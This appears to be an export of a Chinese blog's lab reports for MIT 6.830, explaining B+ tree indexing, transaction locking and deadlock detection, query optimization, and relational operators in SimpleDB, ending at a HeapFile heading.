<p>B + 树与上面的搜索树相似，也是一种多叉搜索树，但它支持动态插入，而且总是平衡的。B + 树的阶记为 d，每个内部节点（根节点除外）的子节点数量需要处在 [d,2d] 之间，每个节点的最大扇出是 2d+1，即 2d 个子节点划分得到 2d+1 个区间。B + 树的叶子节点上保存了左右兄弟的指针，可用于线性扫描。</p>
<p><img src="btree.png"></p>
<p>B + 树与 ISAM 的区别在于，<strong>在底层的叶子页面上，不需要严格按顺序排列</strong>，如上图所示。Page 3 和 Page 5 是邻居的关系，在磁盘上中间还隔着 Page 4。但是叶子节点间的前后指针使得可以遍历叶子页面。这也允许了动态地插入和删除。</p>
<p>典型设置，B + 树的阶为 1600，fill-factor 为 67%（叶子页面的记录占比）</p>
<ul>
<li>平均扇出为 2144</li>
<li> 假设是 128KB 的页面，每条记录 40B</li>
<li> 高度为 1 的树，<span class="math inline">\(2144^2=4,596,736\)</span> records</li>
<li> 高度为 2 的树，<span class="math inline">\(2144^3=9,855,401,984\)</span> records 高</li>
</ul>
<p>高度为 2 的 B + 树就可以容纳近 10 亿的数据，B + 树会非常的矮，进而提高查找效率。B + 树的高度很少超过 3 和 4。</p>
<p><strong>查找</strong>：B + 树的查找与 ISAM 类似，从根节点起，在内部节点内做二分查找定位子节点，直到定位至叶子页面，再在页面内做二分查找。</p>
<p><strong>插入</strong>：</p>
<ul>
<li>当要插入的页面还有空间时，可以直接在页面内插入并排序。</li>
<li>当没有空间时，需要新建页面，并将一半的数据转移到新页面，将新页面插入到父节点中
<ul>
<li>如果父节点也满了，递归向上</li>
</ul></li>
</ul>
<p><strong>删除</strong>：删去元组后，可能会导致页面不满足阶约束，可以选择：</p>
<ul>
<li>直接忽略：数据库场景中，一般插入比删除多，因此删除多出来的空间可以保留，等待后续插入即可</li>
<li>维护约束：
<ul>
<li>当页面不满足约束时，从兄弟页面匀一些多余的元组过来</li>
<li>如果兄弟页面也没有多余的，就需要合并两个页面，递归向上删除节点</li>
</ul></li>
</ul>
<h2 id="exercise">Exercise</h2>
<h3 id="preliminary">Preliminary</h3>
<p>首先，先介绍下 SimpleDB 的 B + 树是怎么设计的。B + 树的页面被分为四种：</p>
<ul>
<li>BTreeHeaderPage：保存 B + 树索引文件的首部信息</li>
<li> BTreeRootPtrPage：用于保存 B + 树根节点的指向，类似一个假根节点，避免插入过程中根节点变化</li>
<li> BTreeInternalPage：非叶子节点，保存 m 个分界点以及 m+1 个子节点</li>
<li> BTreeLeafPage：叶子结点，保存元组数据，以及左右兄弟指针</li>
</ul>
<p>重点需要打交道的是最后两种，它们继承了抽象类 <code>BtreePage</code>，每个页面内包含一个父指针，用于处理递归向上的逻辑。<code>BTreeInternalPage</code> 暴露了一个 <code>Iterator&lt;BTreeEntry&gt;</code>，其中 <code>BTreeEntry</code> 包含以下属性：</p>
<ul>
<li>key：一个值，代表分界点</li>
<li> leftChildId：左孩子的页面 ID</li>
<li>rightChildId：右孩子的页面 ID</li>
</ul>
<p>一个 <code>BTreeInternalPage</code> 保存 m 个分界点，即 m+1 个子节点。</p>
<h3 id="search">Search</h3>
<p>首先，要实现的是查找方法，<code>findLeafPage()</code>，该方法接收一个页面和 <code>Field</code>，返回这个值对应的叶子页面。上面提到，正常在节点内应该是使用二分查找找到对应的孩子节点。由于 <code>BTreeInternalPage</code> 只对外暴露了 <code>Iterator&lt;BTreeEntry&gt; iterator()</code> 方法，这里只能使用遍历的方法，找到孩子节点对应的值区间。再递归查找直到找到叶子页面。</p>
<h3 id="insert-split">Insert （Split）</h3>
<p>然后来到了重头戏，B + 树的插入。Lab 里将拆分节点分为了两个方法，需要分别实现：</p>
<ul>
<li><code>splitLeafPage()</code>：拆分叶子结点，可能需要递归调用父节点的拆分</li>
<li><code>splitInernalPage()</code>：拆分非叶子节点，可能需要递归调用父节点的拆分</li>
</ul>
<p>拆分节点的逻辑可以分为下面几步：</p>
<ol type="1">
<li>新建空白页面，转移一半的数据到新页面，一般是把值较大的一半转移过去</li>
<li>判断父节点是否有空槽，没有的话递归拆父节点</li>
<li>将新页面关联到父页面
<ul>
<li>维护两个页面和父页面间的指向</li>
<li>在父页面新建 entry，key 为大页面的最小值， 左右孩子分别为原页面和新页面</li>
</ul></li>
<li>对于叶子结点，维护左右兄弟指针</li>
</ol>
<p>这里需要注意的是，要把修改后的页面更新在 <code>dirtypages</code> 中，否则会出现读取不一致的现象。Lab 提供了递归的拆分辅助方法，名为 <code>getParentWithEmptySlots</code>，其会判断父页面中是否有空槽，没有的话调用 <code>splitInternalPage</code> 将其拆分，返回一个带有空槽的父页面。</p>
<h3 id="delete-steal">Delete (Steal)</h3>
<p>这个 exercise 要求实现带 “偷取” 逻辑。当一个页面不满足半满约束时，需要从它的兄弟页面中匀一些多余的数据过来。根据页面、兄弟的类型，这部分逻辑被分散在三个方法中：</p>
<ul>
<li><code>stealFromLeafPage</code>：叶子结点间的偷取，<code>isRightSibling</code> 参数标识是否是右侧兄弟</li>
<li><code>stealFromLeftInternalPage</code>：从左侧内部节点偷取</li>
<li><code>stealFromRightInternalPage</code>：从右侧内部节点偷取</li>
</ul>
<p>偷取的逻辑可以分为下面几步：</p>
<ol type="1">
<li>均匀地把数据匀过去，对于每条数据
<ol type="1">
<li>如果是叶子页面的元组记录，转移即可</li>
<li>如果是内部节点的 key 和 child 记录，需要新建 Entry 插入</li>
</ol></li>
<li>更新父节点中 Entry 的 key 值，需要根据左右关系，选择大页面中的最小值作为新的 key 值</li>
<li>更新父节点指向关系</li>
</ol>
<h3 id="deletemerge">Delete（Merge）</h3>
<p>当偷取已经不能满足需要的时候，需要合并两个均达不到半满的节点。同样的，根据节点类型，可以分为：</p>
<ul>
<li><code>mergeLeafPages</code>：合并两个叶子结点</li>
<li><code>mergeInternalPages</code>：合并内部节点</li>
</ul>
<p>合并可以看成偷取的一种极端情况，将两个节点所有的数据都匀到一个节点中，然后删除掉空页面以及父节点中的对应 entry。这个过程中也可能会导致递归向上删除。Lab 提供了 <code>deleteParentEntry</code> 的工具方法来处理删除父节点的 entry 后不满足半满约束的情况，会调用 <code>handleMinOccupancyPage</code> 根据情况调用偷取和合并方法。</p>
<p>当四个 exercise 做完，理论上已经可以通过这四个 exercise 的所有 Test。由于 SimpleDB 本身是使用的页面级别的锁，不存在意向锁的 phantom 问题，如果锁实现正确的话，应该也可以通过 BTreeNextKeyLockingTest 和 BTreeDeadlockTest。如果到目前为止一切都正确，应该可以通过一个很难的 <code>BTreeTest</code>。</p>
<h2 id="总结">总结</h2>
<p>本次 Lab 主要完成了 B + 树的增删查逻辑。Lab 提供了 B + 树索引的整体框架，只需要实现核心的增删查逻辑即可。B + 树还是一个非常复杂的数据结构，自己从头实现的话估计得很久。不过经过这个 Lab，对 B + 树的操作有了更深的认识。</p>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
        <tag>B+树</tag>
        <tag>索引</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 4 实验报告</title>
    <url>/blog/2022/11/29/MIT-6-830-4/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本次 Lab 主要实现的数据库的事务功能，包含并发控制、死锁检测等。本 Lab 要求实现一个页面粒度的锁管理器，支持多事务的并发，且使用等待图完成死锁的检测。</p>
<span id="more"></span>
<h2 id="理论知识">理论知识</h2>
<p>事务是一个包含多个操作的序列，应当被原子化地执行，其具有以下 ACID 特性：</p>
<ul>
<li>原子性（Atomicity:）：事务中的操作要么都被执行，要么都不被执行。</li>
<li>一致性（Consistency）：数据库是执行事务前是一致的，在执行事务后依然是一致的。</li>
<li>隔离性（Isolation）：每个事务的执行与其他事务隔离。实际上 DBMS （数据库管理系统）会在多个事务间交叉执行，并不会按顺序一个个执行，但 DBMS 会保证每个事务看起来是隔离执行的，隐藏了并发的细节。</li>
<li>持久性（Durability）：如果事务提交到数据库，结果会持久存在，即使刚提交 DBMS 就崩溃了也一样。</li>
</ul>
<p>事务管理器包含以下两个模块：</p>
<ul>
<li>锁管理器：使用共享锁、排它锁、意向锁等实现事务间访问的并发控制</li>
<li>日志和恢复：当事务需要回滚时，逐步地撤销事务已完成的操作</li>
</ul>
<h3 id="严格两阶段锁">严格两阶段锁</h3>
<p>为了保证事务的 ACID 特性，DBMS 使用严格两阶段锁（Strict Two Phase Locking）来完成事务的锁管理，该方法具有以下特点：</p>
<ul>
<li>每个资源有一个共享锁（S，Shared）和排它锁（Exclusive，X）。
<ul>
<li>至多一个事务可以持有该资源的排它锁，但是很多其他事务可以持有其的共享锁。</li>
</ul></li>
<li>事务在读之前必须获得排它锁，在写之前必须获得共享锁</li>
<li><strong>事务在释放任何锁之后都无法获得新锁</strong>。这是保证可串行性的关键。</li>
<li><strong>严格两阶段锁特性</strong>：事务在结束前统一释放锁，而非在过程中逐个释放锁。</li>
</ul>
<p>最后一点是为了避免级联回滚的问题。级联回滚意味着回滚一个事务会要求回滚另一个事务。考虑下面的场景</p>
<ol type="1">
<li>T1 先读、写了 R，但是还没有提交到 DBMS</li>
<li>T2 后读、写了 R</li>
</ol>
<p>这时，要回滚 T1，必须回滚 T2，因为 T2 读的是 T1 写后的数据，如果 T1 回滚了，就不存在 T2 读的数据了，即脏数据。</p>
<h3 id="死锁">死锁</h3>
<p>当事务间存在资源的循环等待，满足死锁条件时，就会发生死锁。在操作系统上，通常有以下三种方法处理死锁：</p>
<ul>
<li>预防。按照指定的顺序请求资源，例如静态指定顺序，打破循环等待条件。</li>
<li>避免。分配时预测是否可能出现死锁。</li>
<li>检测和处理。周期性检测是否有死锁，并处理</li>
</ul>
<p>也有一些数据库系统，直接不作处理。如果事务超时了就猜测发生了死锁，直接中止回滚。但这也会误伤真的需要很久才能计算出结果的事务，不提倡。</p>
<p>DBMS 广泛使用的是基于等待图的死锁检测。一个后台进程周期性地构建事务间的依赖图，当依赖图存在环时，就出现了死锁的循环等待条件，即出现了死锁。这种情况下就需要中止某个环内的事务打破循环，可以根据某些指标确定优先级，例如事务的持续时间、持有锁的数量等。</p>
<h3 id="意向锁">意向锁</h3>
<p>锁的粒度需要同时考虑并发性能和管理成本。考虑极端情况：</p>
<ul>
<li>只使用一个锁，锁住整个数据库，很简单，但是不能并行</li>
<li>对每个元组上锁，可以很好的并发，但是锁太多，需要庞大的内存开销，锁管理的负载也会很大</li>
</ul>
<p>因此，需要折中：</p>
<ul>
<li>细粒度的锁有利于并发</li>
<li>少数的锁方便管理</li>
</ul>
<p>多粒度加锁可以较好地折中，其思想是： - 不应该为所有的事务设置相同的锁粒度 - 允许数据可变规模 - 定义一个加锁的层级，高层包含低层 - 可以表示为一棵树</p>
<p>当对底层的元组或者页面加共享锁 / 排他锁时，需要相应的为高层页面加意向共享锁和意向排他锁。意向锁的设计允许高层节点进行 S 和 X 加锁时，无需检查所有的底层节点。如果没有意向锁，需要遍历所有底层节点才能知道能否给这个节点加锁。</p>
<h2 id="exercise">Exercise</h2>
<h3 id="lockmanager">LockManager</h3>
<p>该 Exercise 要求实现 <code>BufferPool</code> 中的读页面请求锁、释放锁等功能，指导书要求在页面层级管理锁，不能直接在表层级加锁。指导书建议使用一个 LockManager 类来管理所有的锁，我先介绍下我对这个类的设计。先从简单的资源抽象开始，一个资源应该由一个唯一键标识，例如 Page 有 PageId，Tuple 有 RecordId。因此，LockManager 实际是维护了一个资源 - 锁的 Map，资源是任意类型的 Object。而锁对象（<code>LockItem</code>），应该包含以下属性：持有锁的事务，当前锁的类型。当一个加锁请求（资源，锁类型，事务）到达锁管理器时：</p>
<ol type="1">
<li>先获取资源的 <code>LockItem</code></li>
<li><code>LockItem</code> 内，同步地判断能否完成这次加锁
<ul>
<li>若可以（锁无事务持有，或类型兼容，或可以直接升级锁），则加锁返回</li>
<li>否则，阻塞在 <code>LockItem</code> 对象上，等待其他事务释放锁后将其唤醒</li>
</ul></li>
</ol>
<p>当释放锁请求到达锁管理器时：</p>
<ol type="1">
<li>先获取资源的 <code>LockItem</code></li>
<li><code>LockItem</code> 内，同步地释放锁，并 <code>notifyAll</code> 其他阻塞线程</li>
</ol>
<p>在设计上，<code>LockManager</code> 应当遵循单例模式。我查阅了 JAVA 实现单例模式的几种方法，最优雅的就是使用枚举类。JAVA 保证了枚举类型的每个值都有唯一实例，进而可以简洁优雅、线程安全的实现单例模式。</p>
<h3 id="lock-lifetime">Lock Lifetime</h3>
<p>该 Exercise 要实现严格两阶段的锁生命周期：逐个地申请锁，只有在事务结束时才可以统一释放锁。锁的申请上，可以直接在 <code>BufferPool.getPage</code> 中进行申请，遵循一个即用即申的模式。</p>
<p>锁的释放上，正常应该在调用 <code>BufferPool.transactionComplete</code> 方法时，统一地释放所有锁。但会有些特殊情况，例如在插入元组的时候，扫到了一个页面没有空槽，这种情况下其实可以释放共享锁了。这看起来跟严格两阶段锁是违背的，但是实际上并不影响，因为插入元组这个操作中，只会对有空槽的页面造成影响。把这些锁及时释放可以允许更多的并行。</p>
<h3 id="no-steal">NO STEAL</h3>
<p>由于种种原因，事务可能中止，这时需要逐个地回滚事务已经完成的操作。在本次 Lab 中，由于还没有日志模块记录已经完成的操作，要使用 NO STEAL 的模式。该模式的思想是，只有当事务提交到 DBMS 后，才将其脏页面写回磁盘。在页面逐出时不能逐出脏页面。这种思想非常的简单有效，只有事务提交后，脏页面写回磁盘，结果才真正生效。当事务中止时，直接将脏页面丢弃即可，无需额外回滚。但是这种方法也有问题，最大的问题是，BufferPool 中只有脏页面的时候，DBMS 就直接崩溃了。不过这种思想还是有好处的，事实上，页面逐出时，逐出脏页面会导致额外的写回开销，有一种策略就是优先逐出非脏页面，减少 IO。</p>
<p>这个 Exercise 在页面逐出时，按照优先级（例如 LRU）找到第一个非脏页面逐出即可。若页面全脏则抛出异常。</p>
<h3 id="transactions">Transactions</h3>
<p>根据上面已经实现的逻辑，实现 <code>transactionComplete(tid, abort)</code> 方法。当事务中止结束时，丢弃脏页面；提交结束后，写回脏页面。无论哪种结束，事务都需要释放持有的所有锁。</p>
<h3 id="deadlocks-and-aborts">Deadlocks and Aborts</h3>
<p>最后来到了本 Lab 的重头戏，死锁的检测。正如前文所说，避免死锁的方法有简单的超时中止，还有基于检测的等待图。指导书要求不能使用简单的超时中止策略，建议在每次分配锁前构建等待图，判断是否会发生死锁。这时，申请加锁就变成了下面的流程：</p>
<ol type="1">
<li>判断此次加锁是否会引入新的等待关系
<ul>
<li>会，构建等待图，判断是否有死锁
<ul>
<li>有，抛出异常</li>
<li>没有，跳出</li>
</ul></li>
<li>不会，跳出</li>
</ul></li>
<li>正常申请锁</li>
</ol>
<p>可以看到，最重要的是多了一个<code>等待图</code>对象，需要保证它线程安全。可以直接使用一个 <code>HashMap&lt;TransacationId, LockItem&gt;</code>，<code>HashMap</code> 本身不是线程安全的，需要读写时加 <code>synchornized</code>，也可以使用线程安全的、并发性能更好的 <code>ConcurrentHashMap</code>。它将 <code>HashMap</code> 按键分成了若干个段，读写时只对对应的段加锁，提升了并发性能。</p>
<h2 id="总结">总结</h2>
<p>本次 Lab 主要实现了事务的并发控制和死锁检测。正如指导书里面提到的，对并发进行 debug 是非常困难的事情。我本人花了一天时间才找到最后一个 exercise 的代码里的 bug 在哪里。当时还看了很多开源的代码实现，发现全是朴素的超时中止策略，没有使用等待图的。自己实现一遍还是收获颇丰。</p>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>事务</tag>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 3 实验报告</title>
    <url>/blog/2022/11/26/MIT-6-830-3/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>Lab 3 要实现的是查询优化模块。在数据库中，查询优化主要在查询被解析为抽象语法树后被调用，用于为指定的查询找到 “最优的” 执行计划。在 SimpleDb 中，这部分定义在 Optimizer 模块中，主要对联合操作进行优化。 <span id="more"></span></p>
<h2 id="理论知识">理论知识</h2>
<p>查询优化模块的作用是为指定的查询找到高效的执行方案。由于 SQL 是声明式语言，查询只声明了想要的结果，并没有规定执行的具体方案。这些结果等价的方案存在于一个计划空间中，包含物理上等价或者关系代数等价的方案。</p>
<ul>
<li>物理等价是指操作的不同物理实现，比如 Join 是使用嵌套循环、Sort-Merge 还是其他，Scan 是使用 Heap Scan 还是 Index Scan，等等。</li>
<li>关系代数等价是指，关系代数上等价的关系。例如一些操作的顺序是可交换的（例如 projection），多种同种操作是可串联的（例如 filter），等等。</li>
</ul>
<p>查询优化的终极目的，是在这个庞大的空间中找到实际上 “最优的” 方案，它使用以下子模块来完成：</p>
<ul>
<li>计划生成器：生成新的、结果等价的计划</li>
<li>成本估计器：估计一个计划的成本，包含 IO 和 CPU，其中 IO 占主要部分</li>
<li>搜索策略：如何在计划空间中行走，常使用动态规划策略</li>
</ul>
<p>为了对搜索空间进行剪枝，查询优化的开山之作，System R 提出只考虑左深树，即执行树只有左侧是深的。这种树可以较好地流水线化。值得注意的是，由于各种原因，查询优化实际上经常找不到最优的实际执行方案，例如，成本估计器的误差，成本估计器基于选择度去计算操作前后的表规模，进而估算 IO 和 CPU cost，每一步都会有误差。因此，实际上，查询优化器是去除一些看起来特别差的执行计划，与理想最优还有差距。</p>
<p>查询优化经常遵循一些启发式的策略，例如：</p>
<ul>
<li>尽早完成列和行的筛选，减小数据规模</li>
<li>避免表间的笛卡尔积</li>
<li>... 等等</li>
</ul>
<h2 id="exercise">Exercise</h2>
<h3 id="inthistogram">IntHistogram</h3>
<p>Histogram，即直方图，用于记录字段的统计信息，即字段值的分布，进而用于估计不同操作的选择度。这在成本估计器中会用到。这类直方图在构建时常用若干个等宽的桶，对应值区间，然后在这些桶间构建分布。IntHistogram 是对整型字段进行统计的类，它的构造函数如下：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">IntHistogram</span><span class="params">(<span class="keyword">int</span> buckets, <span class="keyword">int</span> min, <span class="keyword">int</span> max)</span> </span>{</span><br><span class="line">    <span class="comment">// some code goes here</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>即根据桶的数量、最小值、最大值初始化一个直方图，然后通过 <code>addValue</code> 方法逐个将值加入，最后通过 <code>estimateSelectivity</code> 等方法，估计操作符的选择度。实现逻辑就是将值域等距地划分为指定数量的桶，在添加值时对应桶计数 + 1,。在估计选择度时，要按照两步走的方法，例如 &lt;=，先估计 &lt; 的比率，在桶内再根据均匀分布，估计 = 的比率，求和即可。</p>
<p>值得注意的是，StringHistogram 是通过将字符串映射到整型，再通过 IntHistogram 实现的。但是这两个类并没有实现同样的接口，这给后面带来了麻烦。</p>
<h3 id="tablestats">TableStats</h3>
<p>TableStats 记录了整张表的统计信息，包含每个字段的直方图，以及表的基数。正常应该是保存一个 <code>List&lt;Histogram&gt;</code>，用于保存每个字段的直方图。但并没有 <code>Histogram</code> 这样的接口，而重构代码还需要去修改测试代码，也并不是一种好的做法。我这里使用了一个 <code>List&lt;Object&gt;</code> 加强制类型转换完成，也不是一种值得提倡的做法。不过可以先达到效果。</p>
<p>在确定了如何保存直方图，还有一个问题是如何获得字段的最大最小值。因为直方图的构建需要指定最大最小值，之后才能一个个地添加值。这个过程不是一次遍历能够完成的。因此，需要先遍历一次，记录每个字段的最大最小值，构建直方图，再遍历一次逐个添加值。</p>
<h3 id="join-cardinality">Join Cardinality</h3>
<p>这个 exercise 要求去根据公式估计 join 操作结果的基数和操作成本。操作成本非常简单，根据在 Lab 2 中实现的 Join 策略计算即可。我 Lab 2 是使用的粗暴的嵌套循环的方法，将 IO 成本与 CPU 计算成本相加即可。join 操作的基数则相对难以估计。如果是 equijoin 且某侧字段为主键，那么基数一定不会超过另一张表的基数。这很容易理解，因为左侧主键是不重复的，右侧表中与主键相同的记录可以保留，其他则不会。如果不存在这样的条件，就需要一些策略去估计了：</p>
<ul>
<li>简单启发估计：如果是 equijoin，可以使用较大表的基数作为估计。如果是 range-join，可以按照一定的比例 * 笛卡尔积的基数，作为估计。</li>
<li>基于直方图：要获得准确一点的结果，需要根据两侧的直方图进行估计。例如 equijoin，对于每一个值，去估计在另一个直方图中的数量，然后两个数量相乘最后求和即可。range-join 则要在前一步的基础上，考虑两侧的比率。</li>
</ul>
<h3 id="join-ordering">Join Ordering</h3>
<p>最后一个 Exercise 要求实现找出多个 join 的最优执行方案。Join 操作的被封装在了 <code>LogicalJoinNode</code> 这个类中，包含 Join 的信息，例如两侧表、别名、Join 条件等。目标就是接收一个 <code>List&lt;LogicalJoinNode&gt;</code> 作为输入，找到最优的左深树联合顺序 <code>List&lt;LogicalJoinNode&gt;</code>。伪代码如下所示：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">1. j = set of join nodes</span><br><span class="line">2. for (i in 1...|j|):</span><br><span class="line">3.     for s in {all length i subsets of j}</span><br><span class="line">4.       bestPlan = {}</span><br><span class="line">5.       for s' in {all length d-1 subsets of s}</span><br><span class="line">6.            subplan = optjoin(s')</span><br><span class="line">7.            plan = best way to join (s-s') to subplan</span><br><span class="line">8.            if (cost(plan) &lt; cost(bestPlan))</span><br><span class="line">9.               bestPlan = plan</span><br><span class="line">10.      optjoin(s) = bestPlan</span><br><span class="line">11. return optjoin(j)</span><br></pre></td></tr></tbody></table></figure>
<p>遵循动态规划的思想，按照规模从小到大的顺序建动态规划表。对于给定的规模 i，需要枚举所有该规模的子集，根据小规模的最优结果计算该子集的最优结果。这个伪代码看起来很简单，但是有以下几个难点：</p>
<ul>
<li>如何枚举指定规模的所有子集</li>
<li>如何计算指定 join 顺序的成本，如果子集的最优 join 顺序不支持新元素插入在最后面怎么办</li>
</ul>
<p>实验中给定了一些辅助方法，帮助我们解决了这些问题，虽然并不优雅：</p>
<ul>
<li><code>enumerateSubsets</code> 方法从规模为 1 开始，构建规模为 iS 支持，则直接跳过</li>
</ul>
<p>其中，<code>enumerateSubsets</code> 是一种非常低效的枚举策略，一次性地创建规模为 i 的 Set，会有较大的内存开销。正常的策略是遵循迭代器的模式，每次返回一个新的子集。join 顺序不支持直接跳过也是一种妥协，在动态规划的设定下。</p>
<p>这个 Exercise 就是在上面辅助函数的帮助下，实现上述伪代码。这里我写了一个迭代器类，替代一次返回所有结果的枚举函数。这个枚举函数实际上是在计算组合方案，相对容易改造成迭代器，维护多个指针，然后每次获取新元素时更新指针位置即可。如果是要计算排列方案的话，就要用那个基于左右箭头的算法了。</p>
<h2 id="总结">总结</h2>
<p>查询优化这个 Lab 本身难度不大，属于麻雀虽小五脏俱全。对于成本估计、方案生成、动态规划每部分都涉及到了，但都不深。查询优化的理论知识要更为复杂，只是获得一个搜索空间就要考虑各种关系代数的等价性、Join 交换时的条件问题等等。对于非左深树，这个空间会更大，剪枝和搜索也会更难。动态规划搜索理论上还要考虑每种方案的物理执行类型，是否有可用的排序结果等等。真正完成这些实践就属于重复造轮子了，过于复杂且没有必要。</p>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
        <tag>代码</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 2 实验报告</title>
    <url>/blog/2022/11/20/MIT-6-830-2/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>书接上回，本次 lab 的实验目标是实现数据库的各种操作符，包含 filter、join、aggregate、insert、delete 等。此外，还需要实现第一节没有实现的页面调度算法，处理 <code>BufferPool</code> 满时的页面调度，此外还有脏页面写回等操作。 <span id="more"></span></p>
<p>下面将按 Exercise 的顺序一个个进行介绍。</p>
<h2 id="exercise">Exercise</h2>
<h3 id="opiterator-operator">OpIterator &amp; Operator</h3>
<p>在实现之前，先介绍下操作符的规范接口。基础接口是 <code>OpIterator</code>，它定义了以下方法，本质上是保存了一张临时的表，可以通过 <code>getTupleDesc()</code> 获取表的描述符，通过反复调用 <code>next()</code> 遍历表的每一行。<code>SeqScan</code> 操作符直接实现了 <code>OpIteraotr</code> 接口，根据表的 id 创建这样的迭代器，作为后续操作符的参数。 </p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open</span><span class="params">()</span></span>; <span class="comment">// 开启迭代器</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>; <span class="comment">// 是否有下一个元素</span></span><br><span class="line"><span class="function">Tuple <span class="title">next</span><span class="params">()</span></span>; <span class="comment">// 获取下一个元组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rewind</span><span class="params">()</span></span>; <span class="comment">// 迭代器指针重置</span></span><br><span class="line"><span class="function">TupleDesc <span class="title">getTupleDesc</span><span class="params">()</span></span>; <span class="comment">// 获取表的描述符</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span>; <span class="comment">// 关闭迭代器</span></span><br></pre></td></tr></tbody></table></figure> 操作符规范是一个抽象类 <code>Operator</code>，实现了 <code>OpIterator</code> 的 <code>open</code>、<code>close</code>、<code>hasnext</code>、<code>next</code> 方法，避免逻辑冗余。抽象类中包含以下为实现的方法： <figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">abstract</span> Tuple <span class="title">fetchNext</span><span class="params">()</span> <span class="comment">// 获取下一个元组，不存在则返回null</span></span></span><br><span class="line"><span class="function">TupleDesc <span class="title">getTupleDesc</span><span class="params">()</span></span>; <span class="comment">// 获取表的描述符</span></span><br><span class="line">OpIterator[] getChildren(); <span class="comment">// 获取操作符的参数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setChildren</span><span class="params">(OpIterator[] children)</span></span>; <span class="comment">// 设置操作符的参数</span></span><br></pre></td></tr></tbody></table></figure> 可以看出，一个操作符持有一个或多个的临时表 <code>OpIterator</code> 参数，本身的 <code>fetchNext</code> 则是用于迭代该操作符的结果。换而言之，<code>Operator</code> 是持有 <code>OpIteraotr[]</code> 的 <code>OpIterator</code>，进而实现了操作符的嵌套，操作符一般只接收一个表参数，除了 <code>join</code>。<p></p>
<h3 id="filter-join">Filter &amp; Join</h3>
<p>首先要实现的是 filter 和 join 操作，均继承实现了 <code>Operator</code> 的抽象类，分别对应 SQL 语法中的 where 从句和 join 从句。filter 操作通过 <code>Predicate</code> 对象去判断每行是否存在于最终的结果中，内部持有一个 <code>OpIteraotr</code> 参数代表要遍历的表。要做的事情也很简单，<code>fetchNext</code> 的时候一直迭代表直到找到一条满足条件的记录，返回即可。</p>
<p>Join 操作与之类似，需要先实现 <code>JoinPredicate</code> 用于匹配一对记录是否存在于最终的结果中，<code>fetchNext</code> 操作则相对复杂。<code>join</code> 遍历的实际是两张表的笛卡尔积，需要内部去维护更新这个笛卡尔积的索引，找到符合条件的一对记录后，还要将它们拼接返回。</p>
<h3 id="aggregate">Aggregate</h3>
<p>在 SimpleDB 中，仅考虑对单个字段分组、聚合。根据聚合字段在类型，可以分为整形聚合和字符串型聚合两类。整形聚合支持 max、min、avg 等数值操作，而字符串型聚合只支持 count 操作。两种聚合分别定义在 <code>IntegerAggregator</code> 和 <code>StringAggregator</code> 操作符中，实现了抽象的 <code>Aggregator</code> 接口（而不是 <code>OpIteraotr</code>），包含以下方法：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergeTupleIntoGroup</span><span class="params">(Tuple tup)</span></span>; <span class="comment">// 将新的元组加入到分组结果中</span></span><br><span class="line"><span class="function">OpIterator <span class="title">iterator</span><span class="params">()</span></span>; <span class="comment">// 返回聚合结果的迭代器</span></span><br></pre></td></tr></tbody></table></figure>
<p>可以看到，聚合类是通过 <code>mergeTupleIntoGroup</code> 方法逐条记录地去进行分组，再通过 <code>iterator()</code> 返回结果迭代器，而不是像其他的操作符那样，初始化时就具有表作为输入。我的理解是，由于聚合操作的特点，本身就是要先读取完整个表才能得到分组和聚合结果。如果聚合操作实现操作符接口，也只能是内部再维护一个 <code>OpIterator</code> 结果，所以不如直接解耦这部分逻辑。</p>
<p>两个聚合类的内部实现其实很简单，依赖一个 &lt;GroupValue, AggregateValue&gt; 的 HashMap，对于新的元组，如果不存在分组值，就新建这个分组。这个 HashMap 可以转换成一个 <code>Iterator&lt;Tuple&gt;</code>，核心问题是怎么把这个转成 <code>OpIterator</code>。因为 Java 自带的 <code>Iterator</code> 和 <code>Stream</code> 均不支持重用，我个人构建了一个 <code>Supplier&lt;Stream&lt;Tuple&gt;&gt;</code>，在每次 rewind 的时候获取一个新的 <code>Iterator&lt;Tuple&gt;</code>，这个 <code>Supplier</code> 再通过一个适配器转换成 <code>OpIterator</code>。</p>
<h3 id="heapfile">HeapFile</h3>
